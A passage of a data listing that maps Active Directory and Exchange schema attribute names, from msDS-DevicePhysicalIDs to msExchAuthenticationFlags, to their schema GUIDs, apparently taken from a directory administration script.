        "msDS-DevicePhysicalIDs" = "90615414-a2a0-4447-a993-53409599b74e";
        "msDS-DeviceRegistrationService" = "96bc3a1a-e3d2-49d3-af11-7b0df79d67f5";
        "msDS-DeviceRegistrationServiceContainer" = "310b55ce-3dcd-4392-a96d-c9e35397c24f";
        "msDS-DeviceTrustType" = "c4a46807-6adc-4bbb-97de-6bed181a1bfe";
        "msDS-DnsRootAlias" = "2143acca-eead-4d29-b591-85fa49ce9173";
        "msDS-DrsFarmID" = "6055f766-202e-49cd-a8be-e52bb159edfb";
        "msDS-EgressClaimsTransformationPolicy" = "c137427e-9a73-b040-9190-1b095bb43288";
        "msDS-EnabledFeature" = "5706aeaf-b940-4fb2-bcfc-5268683ad9fe";
        "msDS-EnabledFeatureBL" = "ce5b01bc-17c6-44b8-9dc1-a9668b00901b";
        "msDS-Entry-Time-To-Die" = "e1e9bad7-c6dd-4101-a843-794cec85b038";
        "msDS-ExecuteScriptPassword" = "9d054a5a-d187-46c1-9d85-42dfc44a56dd";
        "msDS-ExpirePasswordsOnSmartCardOnlyAccounts" = "3417ab48-df24-4fb1-80b0-0fcb367e25e3";
        "msDS-ExternalDirectoryObjectId" = "bd29bf90-66ad-40e1-887b-10df070419a6";
        "msDS-ExternalKey" = "b92fd528-38ac-40d4-818d-0433380837c1";
        "msDS-ExternalStore" = "604877cd-9cdb-47c7-b03d-3daadb044910";
        "msDS-FailedInteractiveLogonCount" = "dc3ca86f-70ad-4960-8425-a4d6313d93dd";
        "msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon" = "c5d234e5-644a-4403-a665-e26e0aef5e98";
        "msDS-FilterContainers" = "fb00dcdf-ac37-483a-9c12-ac53a6603033";
        "msDS-GenerationId" = "1e5d393d-8cb7-4b4f-840a-973b36cc09c3";
        "msDS-GeoCoordinatesAltitude" = "a11703b7-5641-4d9c-863e-5fb3325e74e0";
        "msDS-GeoCoordinatesLatitude" = "dc66d44e-3d43-40f5-85c5-3c12e169927e";
        "msDS-GeoCoordinatesLongitude" = "94c42110-bae4-4cea-8577-af813af5da25";
        "msDS-GroupManagedServiceAccount" = "7b8b558a-93a5-4af7-adca-c017e67f1057";
        "msDS-GroupMSAMembership" = "888eedd6-ce04-df40-b462-b8a50e41ba38";
        "msDS-HABSeniorityIndex" = "def449f1-fd3b-4045-98cf-d9658da788b5";
        "msDS-HasDomainNCs" = "6f17e347-a842-4498-b8b3-15e007da4fed";
        "msDS-hasFullReplicaNCs" = "1d3c2d18-42d0-4868-99fe-0eca1e6fa9f3";
        "msDS-HasInstantiatedNCs" = "11e9a5bc-4517-4049-af9c-51554fb0fc09";
        "msDS-hasMasterNCs" = "ae2de0e2-59d7-4d47-8d47-ed4dfe4357ad";
        "msDS-HostServiceAccount" = "80641043-15a2-40e1-92a2-8ca866f70776";
        "msDS-HostServiceAccountBL" = "79abe4eb-88f3-48e7-89d6-f4bc7e98c331";
        "msDS-IngressClaimsTransformationPolicy" = "86284c08-0c6e-1540-8b15-75147d23d20d";
        "msDS-Integer" = "7bc64cea-c04e-4318-b102-3e0729371a65";
        "msDS-IntId" = "bc60096a-1b47-4b30-8877-602c93f56532";
        "msDS-IsCompliant" = "59527d0f-b7c0-4ce2-a1dd-71cef6963292";
        "msDS-IsDomainFor" = "ff155a2a-44e5-4de0-8318-13a58988de4f";
        "msDS-IsEnabled" = "22a95c0e-1f83-4c82-94ce-bea688cfc871";
        "msDS-IsFullReplicaFor" = "c8bc72e0-a6b4-48f0-94a5-fd76a88c9987";
        "msDS-isGC" = "1df5cf33-0fe5-499e-90e1-e94b42718a46";
        "msDS-IsManaged" = "60686ace-6c27-43de-a4e5-f00c2f8d3309";
        "msDS-IsPartialReplicaFor" = "37c94ff6-c6d4-498f-b2f9-c6f7f8647809";
        "msDS-IsPossibleValuesPresent" = "6fabdcda-8c53-204f-b1a4-9df0c67c1eb4";
        "msDS-IsPrimaryComputerFor" = "998c06ac-3f87-444e-a5df-11b03dc8a50c";
        "msDS-isRODC" = "a8e8aa23-3e67-4af1-9d7a-2f1a1d633ac9";
        "msDS-IssuerCertificates" = "6b3d6fda-0893-43c4-89fb-1fb52a6616a9";
        "msDS-IssuerPublicCertificates" = "b5f1edfe-b4d2-4076-ab0f-6148342b0bf6";
        "msDS-IsUsedAsResourceSecurityAttribute" = "51c9f89d-4730-468d-a2b5-1d493212d17e";
        "msDS-IsUserCachableAtRodc" = "fe01245a-341f-4556-951f-48c033a89050";
        "msDS-KeyApproximateLastLogonTimeStamp" = "649ac98d-9b9a-4d41-af6b-f616f2a62e4a";
        "msDS-KeyCredential" = "ee1f5543-7c2e-476a-8b3f-e11f4af6c498";
        "msDS-KeyCredentialLink" = "5b47d60f-6090-40b2-9f37-2a4de88f3063";
        "msDS-KeyCredentialLink-BL" = "938ad788-225f-4eee-93b9-ad24a159e1db";
        "msDS-KeyId" = "c294f84b-2fad-4b71-be4c-9fc5701f60ba";
        "msDS-KeyMaterial" = "a12e0e9f-dedb-4f31-8f21-1311b958182f";
        "msDS-KeyPrincipal" = "bd61253b-9401-4139-a693-356fc400f3ea";
        "msDS-KeyPrincipalBL" = "d1328fbc-8574-4150-881d-0b1088827878";
        "msDS-KeyUsage" = "de71b44c-29ba-4597-9eca-c3348ace1917";
        "msDS-KeyVersionNumber" = "c523e9c0-33b5-4ac8-8923-b57b927f42f6";
        "msDS-KrbTgtLink" = "778ff5c9-6f4e-4b74-856a-d68383313910";
        "msDS-KrbTgtLinkBl" = "5dd68c41-bfdf-438b-9b5d-39d9618bf260";
        "msDS-LastFailedInteractiveLogonTime" = "c7e7dafa-10c3-4b8b-9acd-54f11063742e";
        "msDS-LastKnownRDN" = "8ab15858-683e-466d-877f-d640e1f9a611";
        "msDS-LastSuccessfulInteractiveLogonTime" = "011929e6-8b5d-4258-b64a-00b0b4949747";
        "msDS-LocalEffectiveDeletionTime" = "94f2800c-531f-4aeb-975d-48ac39fd8ca4";
        "msDS-LocalEffectiveRecycleTime" = "4ad6016b-b0d2-4c9b-93b6-5964b17b968c";
        "msDS-LockoutDuration" = "421f889a-472e-4fe4-8eb9-e1d0bc6071b2";
        "msDS-LockoutObservationWindow" = "b05bda89-76af-468a-b892-1be55558ecc8";
        "msDS-LockoutThreshold" = "b8c8c35e-4a19-4a95-99d0-69fe4446286f";
        "msDS-LogonTimeSyncInterval" = "ad7940f8-e43a-4a42-83bc-d688e59ea605";
        "msDS-ManagedPassword" = "e362ed86-b728-0842-b27d-2dea7a9df218";
        "msDS-ManagedPasswordId" = "0e78295a-c6d3-0a40-b491-d62251ffa0a6";
        "msDS-ManagedPasswordInterval" = "f8758ef7-ac76-8843-a2ee-a26b4dcaf409";
        "msDS-ManagedPasswordPreviousId" = "d0d62131-2d4a-d04f-99d9-1c63646229a4";
        "msDS-ManagedServiceAccount" = "ce206244-5827-4a86-ba1c-1c0c386c1b64";
        "msDs-masteredBy" = "60234769-4819-4615-a1b2-49d2f119acb5";
        "msDS-MaximumPasswordAge" = "fdd337f5-4999-4fce-b252-8ff9c9b43875";
        "msDS-MaximumRegistrationInactivityPeriod" = "0a5caa39-05e6-49ca-b808-025b936610e7";
        "msDs-MaxValues" = "d1e169a4-ebe9-49bf-8fcb-8aef3874592d";
        "msds-memberOfTransitive" = "862166b6-c941-4727-9565-48bfff2941de";
        "msDS-MembersForAzRole" = "cbf7e6cd-85a4-4314-8939-8bfe80597835";
        "msDS-MembersForAzRoleBL" = "ececcd20-a7e0-4688-9ccf-02ece5e287f5";
        "msDS-MembersOfResourcePropertyList" = "4d371c11-4cad-4c41-8ad2-b180ab2bd13c";
        "msDS-MembersOfResourcePropertyListBL" = "7469b704-edb0-4568-a5a5-59f4862c75a7";
        "msds-memberTransitive" = "e215395b-9104-44d9-b894-399ec9e21dfc";
        "msDS-MinimumPasswordAge" = "2a74f878-4d9c-49f9-97b3-6767d1cbd9a3";
        "msDS-MinimumPasswordLength" = "b21b3439-4c3a-441c-bb5f-08f20e9b315e";
        "msDS-NC-Replica-Locations" = "97de9615-b537-46bc-ac0f-10720f3909f3";
        "msDS-NC-RO-Replica-Locations" = "3df793df-9858-4417-a701-735a1ecebf74";
        "msDS-NC-RO-Replica-Locations-BL" = "f547511c-5b2a-44cc-8358-992a88258164";
        "msDS-NCReplCursors" = "8a167ce4-f9e8-47eb-8d78-f7fe80abb2cc";
        "msDS-NCReplInboundNeighbors" = "9edba85a-3e9e-431b-9b1a-a5b6e9eda796";
        "msDS-NCReplOutboundNeighbors" = "855f2ef5-a1c5-4cc4-ba6d-32522848b61f";
        "msDS-NcType" = "5a2eacd7-cc2b-48cf-9d9a-b6f1a0024de9";
        "msDS-NeverRevealGroup" = "15585999-fd49-4d66-b25d-eeb96aba8174";
        "msDS-Non-Security-Group-Extra-Classes" = "2de144fc-1f52-486f-bdf4-16fcc3084e54";
        "msDS-NonMembers" = "cafcb1de-f23c-46b5-adf7-1e64957bd5db";
        "msDS-NonMembersBL" = "2a8c68fc-3a7a-4e87-8720-fe77c51cbe74";
        "msDS-ObjectReference" = "638ec2e8-22e7-409c-85d2-11b21bee72de";
        "msDS-ObjectReferenceBL" = "2b702515-c1f7-4b3b-b148-c0e4c6ceecb4";
        "msDS-ObjectSoa" = "34f6bdf5-2e79-4c3b-8e14-3d93b75aab89";
        "msDS-OIDToGroupLink" = "f9c9a57c-3941-438d-bebf-0edaf2aca187";
        "msDS-OIDToGroupLinkBl" = "1a3d0d20-5844-4199-ad25-0f5039a76ada";
        "msDS-OperationsForAzRole" = "93f701be-fa4c-43b6-bc2f-4dbea718ffab";
        "msDS-OperationsForAzRoleBL" = "f85b6228-3734-4525-b6b7-3f3bb220902c";
        "msDS-OperationsForAzTask" = "1aacb436-2e9d-44a9-9298-ce4debeb6ebf";
        "msDS-OperationsForAzTaskBL" = "a637d211-5739-4ed1-89b2-88974548bc59";
        "msDS-OptionalFeature" = "44f00041-35af-468b-b20a-6ce8737c580b";
        "msDS-OptionalFeatureFlags" = "8a0560c1-97b9-4811-9db7-dc061598965b";
        "msDS-OptionalFeatureGUID" = "9b88bda8-dd82-4998-a91d-5f2d2baf1927";
        "msDS-Other-Settings" = "79d2f34c-9d7d-42bb-838f-866b3e4400e2";
        "msDS-parentdistname" = "b918fe7d-971a-f404-9e21-9261abec970b";
        "msDS-PasswordComplexityEnabled" = "db68054b-c9c3-4bf0-b15b-0fb52552a610";
        "msDS-PasswordHistoryLength" = "fed81bb7-768c-4c2f-9641-2245de34794d";
        "msDS-PasswordReversibleEncryptionEnabled" = "75ccdd8f-af6c-4487-bb4b-69e4d38a959c";
        "msDS-PasswordSettings" = "3bcd9db8-f84b-451c-952f-6c52b81f9ec6";
        "msDS-PasswordSettingsContainer" = "5b06b06a-4cf3-44c0-bd16-43bc10a987da";
        "msDS-PasswordSettingsPrecedence" = "456374ac-1f0a-4617-93cf-bc55a7c9d341";
        "msDS-PerUserTrustQuota" = "d161adf0-ca24-4993-a3aa-8b2c981302e8";
        "msDS-PerUserTrustTombstonesQuota" = "8b70a6c6-50f9-4fa3-a71e-1ce03040449b";
        "msDS-PhoneticCompanyName" = "5bd5208d-e5f4-46ae-a514-543bc9c47659";
        "msDS-PhoneticDepartment" = "6cd53daf-003e-49e7-a702-6fa896e7a6ef";
        "msDS-PhoneticDisplayName" = "e21a94e4-2d66-4ce5-b30d-0ef87a776ff0";
        "msDS-PhoneticFirstName" = "4b1cba4e-302f-4134-ac7c-f01f6c797843";
        "msDS-PhoneticLastName" = "f217e4ec-0836-4b90-88af-2f5d4bbda2bc";
        "msDS-Preferred-GC-Site" = "d921b50a-0ab2-42cd-87f6-09cf83a91854";
        "msDS-preferredDataLocation" = "fa0c8ade-4c94-4610-bace-180efdee2140";
        "msDS-PrimaryComputer" = "a13df4e2-dbb0-4ceb-828b-8b2e143e9e81";
        "msDS-PrincipalName" = "564e9325-d057-c143-9e3b-4f9e5ef46f93";
        "msDS-PromotionSettings" = "c881b4e2-43c0-4ebe-b9bb-5250aa9b434c";
        "msDS-PSOApplied" = "5e6cf031-bda8-43c8-aca4-8fee4127005b";
        "msDS-PSOAppliesTo" = "64c80f48-cdd2-4881-a86d-4e97b6f561fc";
        "msDS-QuotaAmount" = "fbb9a00d-3a8c-4233-9cf9-7189264903a1";
        "msDS-QuotaContainer" = "da83fc4f-076f-4aea-b4dc-8f4dab9b5993";
        "msDS-QuotaControl" = "de91fc26-bd02-4b52-ae26-795999e96fc7";
        "msDS-QuotaEffective" = "6655b152-101c-48b4-b347-e1fcebc60157";
        "msDS-QuotaTrustee" = "16378906-4ea5-49be-a8d1-bfd41dff4f65";
        "msDS-QuotaUsed" = "b5a84308-615d-4bb7-b05f-2f1746aa439f";
        "msDS-RegisteredOwner" = "617626e9-01eb-42cf-991f-ce617982237e";
        "msDS-RegisteredUsers" = "0449160c-5a8e-4fc8-b052-01c0f6e48f02";
        "msDS-RegistrationQuota" = "ca3286c2-1f64-4079-96bc-e62b610e730f";
        "msDS-ReplAttributeMetaData" = "d7c53242-724e-4c39-9d4c-2df8c9d66c7a";
        "msDS-Replication-Notify-First-DSA-Delay" = "85abd4f4-0a89-4e49-bdec-6f35bb2562ba";
        "msDS-Replication-Notify-Subsequent-DSA-Delay" = "d63db385-dd92-4b52-b1d8-0d3ecc0e86b6";
        "msDS-ReplicationEpoch" = "08e3aa79-eb1c-45b5-af7b-8f94246c8e41";
        "msDS-ReplValueMetaData" = "2f5c8145-e1bd-410b-8957-8bfa81d5acfd";
        "msDS-ReplValueMetaDataExt" = "1e02d2ef-44ad-46b2-a67d-9fd18d780bca";
        "msDS-RequiredDomainBehaviorVersion" = "eadd3dfe-ae0e-4cc2-b9b9-5fe5b6ed2dd2";
        "msDS-RequiredForestBehaviorVersion" = "4beca2e8-a653-41b2-8fee-721575474bec";
        "msDS-ResourceProperties" = "7a4a4584-b350-478f-acd6-b4b852d82cc0";
        "msDS-ResourceProperty" = "5b283d5e-8404-4195-9339-8450188c501a";
        "msDS-ResourcePropertyList" = "72e3d47a-b342-4d45-8f56-baff803cabf9";
        "msDS-ResultantPSO" = "b77ea093-88d0-4780-9a98-911f8e8b1dca";
        "msDS-RetiredReplNCSignatures" = "d5b35506-19d6-4d26-9afb-11357ac99b5e";
        "msDS-RevealedDSAs" = "94f6f2ac-c76d-4b5e-b71f-f332c3e93c22";
        "msDS-RevealedList" = "cbdad11c-7fec-387b-6219-3a0627d9af81";
        "msDS-RevealedListBL" = "aa1c88fd-b0f6-429f-b2ca-9d902266e808";
        "msDS-RevealedUsers" = "185c7821-3749-443a-bd6a-288899071adb";
        "msDS-RevealOnDemandGroup" = "303d9f4a-1dd6-4b38-8fc5-33afe8c988ad";
        "msDS-RIDPoolAllocationEnabled" = "24977c8c-c1b7-3340-b4f6-2b375eb711d7";
        "msDs-Schema-Extensions" = "b39a61be-ed07-4cab-9a4a-4963ed0141e1";
        "msDS-SDReferenceDomain" = "4c51e316-f628-43a5-b06b-ffb695fcb4f3";
        "msDS-SecondaryKrbTgtNumber" = "aa156612-2396-467e-ad6a-28d23fdb1865";
        "msDS-Security-Group-Extra-Classes" = "4f146ae8-a4fe-4801-a731-f51848a4f4e4";
        "msDS-ServiceAllowedNTLMNetworkAuthentication" = "278947b9-5222-435e-96b7-1503858c2b48";
        "msDS-ServiceAllowedToAuthenticateFrom" = "97da709a-3716-4966-b1d1-838ba53c3d89";
        "msDS-ServiceAllowedToAuthenticateTo" = "f2973131-9b4d-4820-b4de-0474ef3b849f";
        "msDS-ServiceAuthNPolicy" = "2a6a6d95-28ce-49ee-bb24-6d1fc01e3111";
        "msDS-ServiceAuthNPolicyBL" = "2c1128ec-5aa2-42a3-b32d-f0979ca9fcd2";
        "msDS-ServiceTGTLifetime" = "5dfe3c20-ca29-407d-9bab-8421e55eb75c";
        "msDS-Settings" = "0e1b47d7-40a3-4b48-8d1b-4cac0c1cdf21";
        "msDS-ShadowPrincipal" = "770f4cb3-1643-469c-b766-edd77aa75e14";
        "msDS-ShadowPrincipalContainer" = "11f95545-d712-4c50-b847-d2781537c633";
        "msDS-ShadowPrincipalSid" = "1dcc0722-aab0-4fef-956f-276fe19de107";
        "msDS-Site-Affinity" = "c17c5602-bcb7-46f0-9656-6370ca884b72";
        "msDS-SiteName" = "98a7f36d-3595-448a-9e6f-6b8965baed9c";
        "msDS-SourceAnchor" = "b002f407-1340-41eb-bca0-bd7d938e25a9";
        "msDS-SourceObjectDN" = "773e93af-d3b4-48d4-b3f9-06457602d3d0";
        "msDS-SPNSuffixes" = "789ee1eb-8c8e-4e4c-8cec-79b31b7617b5";
        "msDS-StrongNTLMPolicy" = "aacd2170-482a-44c6-b66e-42c2f66a285c";
        "msDS-SupportedEncryptionTypes" = "20119867-1d04-4ab7-9371-cfc3d5df0afd";
        "msDS-SyncServerUrl" = "b7acc3d2-2a74-4fa4-ac25-e63fe8b61218";
        "msDS-TasksForAzRole" = "35319082-8c4a-4646-9386-c2949d49894d";
        "msDS-TasksForAzRoleBL" = "a0dcd536-5158-42fe-8c40-c00a7ad37959";
        "msDS-TasksForAzTask" = "b11c8ee2-5fcd-46a7-95f0-f38333f096cf";
        "msDS-TasksForAzTaskBL" = "df446e52-b5fa-4ca2-a42f-13f98a526c8f";
        "msDS-TDOEgressBL" = "d5006229-9913-2242-8b17-83761d1e0e5b";
        "msDS-TDOIngressBL" = "5a5661a1-97c6-544b-8056-e430fe7bc554";
        "msds-tokenGroupNames" = "65650576-4699-4fc9-8d18-26e0cd0137a6";
        "msds-tokenGroupNamesGlobalAndUniversal" = "fa06d1f4-7922-4aad-b79c-b2201f54417c";
        "msds-tokenGroupNamesNoGCAcceptable" = "523fc6c8-9af4-4a02-9cd7-3dea129eeb27";
        "msDS-TombstoneQuotaFactor" = "461744d7-f3b6-45ba-8753-fb9552a5df32";
        "msDS-TopQuotaUsage" = "7b7cce4f-f1f5-4bb6-b7eb-23504af19e75";
        "msDS-TransformationRules" = "55872b71-c4b2-3b48-ae51-4095f91ec600";
        "msDS-TransformationRulesCompiled" = "0bb49a10-536b-bc4d-a273-0bab0dd4bd10";
        "msDS-TrustForestTrustInfo" = "29cc866e-49d3-4969-942e-1dbc0925d183";
        "msDS-UpdateScript" = "146eb639-bb9f-4fc1-a825-e29e00c77920";
        "msDS-User-Account-Control-Computed" = "2cc4b836-b63f-4940-8d23-ea7acf06af56";
        "msDS-UserAllowedNTLMNetworkAuthentication" = "7ece040f-9327-4cdc-aad3-037adfe62639";
        "msDS-UserAllowedToAuthenticateFrom" = "2c4c9600-b0e1-447d-8dda-74902257bdb5";
        "msDS-UserAllowedToAuthenticateTo" = "de0caa7f-724e-4286-b179-192671efc664";
        "msDS-UserAuthNPolicy" = "cd26b9f3-d415-442a-8f78-7c61523ee95b";
        "msDS-UserAuthNPolicyBL" = "2f17faa9-5d47-4b1f-977e-aa52fabe65c8";
        "msDS-UserPasswordExpiryTimeComputed" = "add5cf10-7b09-4449-9ae6-2534148f8a72";
        "msDS-UserTGTLifetime" = "8521c983-f599-420f-b9ab-b1222bdf95c1";
        "msDS-USNLastSyncSuccess" = "31f7b8b6-c9f8-4f2d-a37b-58a823030331";
        "msDS-ValueType" = "e3c27fdf-b01d-4f4e-87e7-056eef0eb922";
        "msDS-ValueTypeReference" = "78fc5d84-c1dc-3148-8984-58f792d41d3e";
        "msDS-ValueTypeReferenceBL" = "ab5543ad-23a1-3b45-b937-9b313d5474a8";
        "msExch2003Url" = "9632a094-6357-4669-bdac-e57561896a95";
        "msExchAcceptedDomain" = "9d71afc6-2c40-4c23-8cd7-e55b7d3129bd";
        "msExchAcceptedDomainFlags" = "c7b9a038-99d2-48da-b22c-8a5412cf7a81";
        "msExchAcceptedDomainName" = "9a895c75-f88c-4fd0-a0da-91ff20affa2c";
        "msExchAccessControlMap" = "8ff54464-b093-11d2-aa06-00c04f8eedd8";
        "msExchAccessFlags" = "901b6a04-b093-11d2-aa06-00c04f8eedd8";
        "msExchAccessSSLFlags" = "903f2d4a-b093-11d2-aa06-00c04f8eedd8";
        "msExchActivationConfig" = "f817e5f7-e036-4a03-bb15-56b6c04ee5c1";
        "msExchActivationPreference" = "f2d7918a-47c0-47ee-b3d1-b7f1f7ca348b";
        "msExchActiveDirectoryConnector" = "e605672c-a980-11d2-a9ff-00c04f8eedd8";
        "msExchActiveInstanceSleepInterval" = "56b577fe-917e-480e-83bb-d23646d40a83";
        "msExchActiveSyncDevice" = "e8b2aff2-59a7-4eac-9a70-819adef701dd";
        "msExchActiveSyncDeviceAutoBlockDuration" = "655fb65d-efdd-4f35-9db3-9c9c75dbe234";
        "msExchActiveSyncDeviceAutoblockThreshold" = "086f4013-017e-4183-acf0-2d3f5d6f3aac";
        "msExchActiveSyncDeviceAutoblockThresholdIncidenceDuration" = "8473d85d-b9ac-4506-ae15-ca7f9bf61461";
        "msExchActiveSyncDeviceAutoblockThresholdIncidenceLimit" = "949330ac-29a5-41b5-bad3-c5431fe42265";
        "msExchActiveSyncDeviceAutoblockThresholdType" = "e0231fe1-7df0-44f2-bf4e-bbb72fbf25f2";
        "msExchActiveSyncDevices" = "c975c901-6cea-4b6f-8319-d67f45449506";
        "msExchActivityBasedAuthenticationTimeoutInterval" = "3eb6474d-037e-4c32-a8e2-46791f56254c";
        "msExchADCGlobalNames" = "9062f090-b093-11d2-aa06-00c04f8eedd8";
        "msExchADCObjectType" = "4859fb55-1924-11d3-aa59-00c04f8eedd8";
        "msExchADCOptions" = "90891630-b093-11d2-aa06-00c04f8eedd8";
        "msExchAddGroupsToToken" = "9c4d7592-ef4a-4c69-8f30-6f18ca1ec370";
        "msExchAdditionalDNMap" = "90a814c2-b093-11d2-aa06-00c04f8eedd8";
        "msExchAddressBookFlags" = "81df9423-c510-41c9-a50b-8aa15c112fcb";
        "msExchAddressBookMailboxPolicy" = "b8bef5a3-c582-43f6-babd-f13e4f8fbb1b";
        "msExchAddressBookPolicyBL" = "1590bd34-49ed-4a9a-ad8e-fd07b5a103dd";
        "msExchAddressBookPolicyLink" = "3971b7b1-b279-43a2-86b6-31971e5bcf2b";
        "msExchAddressingPolicy" = "e7211f02-a980-11d2-a9ff-00c04f8eedd8";
        "msExchAddressListOU" = "f4b93a0d-f30c-44ff-aa47-e74806dbced2";
        "msExchAddressListPagingEnabled" = "c7abed00-b694-49fb-9739-94ed8b54a683";
        "msExchAddressListsBL" = "14fc0dc6-4c57-43d2-a174-e93e4e0d3931";
        "msExchAddressListService" = "e6a2c260-a980-11d2-a9ff-00c04f8eedd8";
        "msExchAddressListServiceBL" = "8a407b6e-b09e-11d2-aa06-00c04f8eedd8";
        "msExchAddressListServiceContainer" = "b1fce95a-1d44-11d3-aa5e-00c04f8eedd8";
        "msExchAddressListServiceLink" = "9b6e9584-b093-11d2-aa06-00c04f8eedd8";
        "msExchAddressListsLink" = "e988ce77-5f17-414e-acb7-27cc56f4e5d0";
        "msExchAddressRewriteConfiguration" = "5d0017d1-43d9-4a0e-8fbc-2adfc96c29bf";
        "msExchAddressRewriteEntry" = "997f7363-a2c7-4464-9a75-220a8239ccdc";
        "msExchAddressRewriteExceptionList" = "dee53c8c-57fb-4fc3-8669-14fb9de1d1ed";
        "msExchAddressRewriteExternalName" = "1156e66d-d22b-45eb-a610-b68ae27f9471";
        "msExchAddressRewriteInternalName" = "405dac38-c318-4635-b778-51baafc57beb";
        "msExchAddressRewriteMappingType" = "02e502d8-1205-489b-aa84-03b95c9a2593";
        "msExchAdminACL" = "90c975ae-b093-11d2-aa06-00c04f8eedd8";
        "msExchAdminAuditLogAgeLimit" = "f152ff86-0f61-43f9-bc2f-36689bc2ee39";
        "msExchAdminAuditLogCmdlets" = "fb6e41f5-8064-458e-9587-772658ec4c17";
        "msExchAdminAuditLogConfig" = "8be04d21-0820-4263-a287-0e6006005729";
        "msExchAdminAuditLogExcludedCmdlets" = "7cb4185b-f306-4546-a4a2-b9a045aacd56";
        "msExchAdminAuditLogFlags" = "204b76cb-b634-4f89-a25a-e16c35277060";
        "msExchAdminAuditLogMailbox" = "4de4cd00-9986-4474-9427-8f704449ff4f";
        "msExchAdminAuditLogParameters" = "6435e904-2de4-4600-b61f-89d4105c0ef2";
        "msExchAdminGroup" = "e768a58e-a980-11d2-a9ff-00c04f8eedd8";
        "msExchAdminGroupContainer" = "e7a44058-a980-11d2-a9ff-00c04f8eedd8";
        "msExchAdminGroupMode" = "90ead69a-b093-11d2-aa06-00c04f8eedd8";
        "msExchAdminGroupsEnabled" = "e32977ae-1d31-11d3-aa5e-00c04f8eedd8";
        "msExchAdminMailbox" = "94e9a76c-b093-11d2-aa06-00c04f8eedd8";
        "msExchAdminRole" = "e7f2edf2-a980-11d2-a9ff-00c04f8eedd8";
        "msExchAdmins" = "b644c27a-a419-40b6-a62e-180930df5610";
        "msExchAdvancedSecurityContainer" = "8cc8fb0e-b09e-11d2-aa06-00c04f8eedd8";
        "msExchAgent" = "39c9981c-2b54-48f5-ba1f-0fe2f5b3fd0f";
        "msExchAgentsFlags" = "c8975410-b516-48a6-b6f8-037cf46b3c25";
        "msExchAggregationSubscriptionCredential" = "84568698-7fcb-48ce-90ff-700427d90d30";
        "msExchAgingKeepTime" = "5872299f-123a-11d3-aa58-00c04f8eedd8";
        "msExchAliasGenFormat" = "912b3618-b093-11d2-aa06-00c04f8eedd8";
        "msExchAliasGenType" = "914ef95e-b093-11d2-aa06-00c04f8eedd8";
        "msExchAliasGenUniqueness" = "91705a4a-b093-11d2-aa06-00c04f8eedd8";
        "msExchAllowAdditionalResources" = "91941d90-b093-11d2-aa06-00c04f8eedd8";
        "msExchAllowCrossSiteRPCClientAccess" = "c1247c78-9495-4554-bcd1-57cf37b4d9d1";
        "msExchAllowEnhancedSecurity" = "63b79cf2-1f4b-4766-ba5b-814b6077640f";
        "msExchAllowHeuristicADCallingLineIdResolution" = "6dd69ffa-347b-4a2e-b738-d5ac950641b0";
        "msExchAllowTimeExtensions" = "91b7e0d6-b093-11d2-aa06-00c04f8eedd8";
        "msExchAllRoomListBL" = "6d3b1184-101f-49fc-8681-99601dae0aea";
        "msExchAllRoomListLink" = "e414d8fe-dab6-4f2d-96b7-197d3a5c874f";
        "msExchALObjectVersion" = "910c3786-b093-11d2-aa06-00c04f8eedd8";
        "msExchAlternateFileShareWitness" = "e81023b9-5f49-446d-9806-235c45ddf59a";
        "msExchAlternateFileShareWitnessDirectory" = "fd33124f-3af5-4a95-aae6-a7c47b65bd3d";
        "msExchAlternateMailboxes" = "ec6de1ca-09cd-4dcc-be76-79c5b0731a50";
        "msExchAlternateServer" = "974c99f9-33fc-11d3-aa6e-00c04f8eedd8";
        "msExchAnonymousThrottlingPolicyState" = "de48445d-9b15-46c0-940a-57b9a47cbc3f";
        "msExchAppliesToSmtpVS" = "2925413e-fa41-4d01-945d-a15b5d6bb965";
        "msExchAppliesToSmtpVSBL" = "f7d091b1-1ced-446a-b521-563a01eaf22c";
        "msExchApprovalApplication" = "d7bd16b6-f72f-496c-85ad-f9a50acd2fe7";
        "msExchApprovalApplicationContainer" = "edb4bf22-4062-49ca-87c9-02cff41f263f";
        "msExchApprovalApplicationLink" = "3f1a8db1-d99d-4b5b-b1e7-499ef78bafd6";
        "msExchArbitrationMailbox" = "2bc2106c-3316-484f-bf67-775892c51a06";
        "msExchArbitrationMailboxesBL" = "831e4e7b-96d8-4c78-8694-5fac41c6e81b";
        "msExchArchiveAddress" = "5d605524-aff9-44d5-b190-ae16d119dfb4";
        "msExchArchiveDatabaseBL" = "e40a9920-17cf-449e-9e1e-86ad2e8d3c17";
        "msExchArchiveDatabaseLink" = "82ea1d67-5655-4837-8966-c2359d5cd32e";
        "msExchArchiveGUID" = "1ef46618-d2db-4d9a-b0fa-e8e712ffd8d5";
        "msExchArchiveName" = "570d6f5b-002f-4f63-83b0-a0feefff277d";
        "msExchArchiveQuota" = "3b965adc-ec92-4564-8430-0e7441859682";
        "msExchArchiveStatus" = "b1d6bdd0-2a3d-4aba-8c72-40640a999566";
        "msExchArchiveWarnQuota" = "3899c1e1-28f0-4305-b3fa-d800fa0a553a";
        "msExchAssembly" = "cb56dfe9-2e67-46fc-b230-7ac6c6e156e3";
        "msExchAssistantName" = "a8df7394-c5ea-11d1-bbcb-0080c76670c0";
        "msExchAssistantsMaintenanceSchedule" = "c47c2d77-1886-45bc-9240-94afc0d37007";
        "msExchAssistantsThrottleWorkcycle" = "b9ef6290-28f2-43c5-ba8f-05f8df7d0c29";
        "msExchAssociatedAG" = "e5971321-1d3e-11d3-aa5e-00c04f8eedd8";
        "msExchAttachmentFilteringAdminMessage" = "57bdcbb8-c793-4138-8078-9fdaeb2747e9";
        "msExchAttachmentFilteringAttachmentNames" = "02040a7e-00e1-4392-b3f1-4985748ab7ad";
        "msExchAttachmentFilteringContentTypes" = "68ddc0b3-0793-4bd1-a62f-3db9c1f207b0";
        "msExchAttachmentFilteringExceptionConnectorsLink" = "f99af030-7df1-49cc-8d36-de0d766f2a7b";
        "msExchAttachmentFilteringFilterAction" = "2253874c-6cd6-48fb-bcbb-7aeb900f08f2";
        "msExchAttachmentFilteringRejectResponse" = "637c3f3e-7e56-4dc7-9ca2-04e45efadee6";
        "msExchAuditAdmin" = "3b03102e-9b2d-4d7d-979e-72e4f4d0b22b";
        "msExchAuditDelegate" = "6258a6c5-63fd-46a4-aa55-d52dd0eec253";
        "msExchAuditDelegateAdmin" = "4d559125-6169-465a-9a27-867d39c0f0b3";
        "msExchAuditFlags" = "91d47d0e-b093-11d2-aa06-00c04f8eedd8";
        "msExchAuditOwner" = "71a120b2-d9c8-4c2c-b452-90ab50897aa6";
        "msExchAuthenticationFlags" = "91f5ddfa-b093-11d2-aa06-00c04f8eedd8";
